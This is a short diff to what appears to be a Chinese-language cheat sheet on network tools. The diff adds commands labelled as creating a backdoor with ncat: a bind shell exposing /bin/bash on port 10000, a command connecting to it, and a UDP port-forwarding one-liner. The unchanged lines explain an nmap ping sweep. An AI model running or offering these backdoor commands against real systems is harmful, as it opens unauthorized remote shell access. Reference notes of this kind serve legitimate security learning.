@@ -1,3 +1,10 @@
+通过 nc 创建后门
+ncat -l 10000 -e /bin/bash
+ncat 192.168.1.100 10000
+通过 nc 进行端口转发
+ncat -u -l  80 -c  'ncat -u -l 8080'
+
+
 nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.lijiejie.com/16
 -sn    不扫描端口，只ping主机
 -PE   通过ICMP echo判定主机是否存活
